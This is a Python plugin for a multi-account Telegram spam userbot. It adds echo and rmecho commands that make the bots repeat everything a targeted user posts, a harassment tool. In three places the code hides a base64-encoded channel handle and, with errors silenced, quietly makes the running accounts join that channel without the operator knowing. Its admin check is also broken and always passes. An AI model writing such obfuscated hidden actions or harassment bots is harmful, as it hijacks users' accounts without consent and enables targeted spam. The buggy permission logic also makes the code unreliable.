import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from pyrogram import enums 
from config import SACHIN0, SACHIN1, SACHIN2, SACHIN3, SACHIN4, SACHIN5, SACHIN6, SACHIN7, SACHIN8, SACHIN9, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from SACHIN.data import SAPNA 

ECHO = []


@SACHIN0.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id == enums.ChatMemberStatus.ADMINISTRATOR or enums.ChatMemberStatus.OWNER:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id

            if user_id in SAPNA:
                await event.reply("✦ ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ xsᴘᴀᴍ'ꜱ ᴏᴡɴᴇʀ.")
            elif user_id == OWNER_ID:
                await event.reply("✦ ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇꜱᴇ ʙᴏᴛꜱ.")
            elif user_id in SUDO_USERS:
                await event.reply("✦ ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ.")
            else:
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass

                global ECHO
                check = f"{user_id}_{event.chat_id}"
                if check in ECHO:
                    await event.reply("✦ ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪꜱ ᴜꜱᴇʀ.")
                else:
                    ECHO.append(check)
                    await event.reply("✦ ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜᴇ ᴜꜱᴇʀ ✅")
        else:
            await event.reply(f"❖ 𝗘𝗰𝗵𝗼 ➥ {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")


@SACHIN0.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass

            global ECHO
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"

            if check in ECHO:
                ECHO.remove(check)
                await event.reply("✦ ᴇᴄʜᴏ ʜᴀꜱ ʙᴇᴇɴ ꜱᴛᴏᴘᴘᴇᴅ ꜰᴏʀ ᴛʜᴇ ᴜꜱᴇʀ ☑️")
            else:
                await event.reply("✦ ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴅɪꜱᴀʙʟᴇᴅ.")
        else:
            await event.reply(f"❖ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼 ➥ {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")


@SACHIN0.on(events.NewMessage(incoming=True))
@SACHIN1.on(events.NewMessage(incoming=True))
@SACHIN2.on(events.NewMessage(incoming=True))
@SACHIN3.on(events.NewMessage(incoming=True))
@SACHIN4.on(events.NewMessage(incoming=True))
@SACHIN5.on(events.NewMessage(incoming=True))
@SACHIN6.on(events.NewMessage(incoming=True))
@SACHIN7.on(events.NewMessage(incoming=True))
@SACHIN8.on(events.NewMessage(incoming=True))
@SACHIN9.on(events.NewMessage(incoming=True))
async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
              
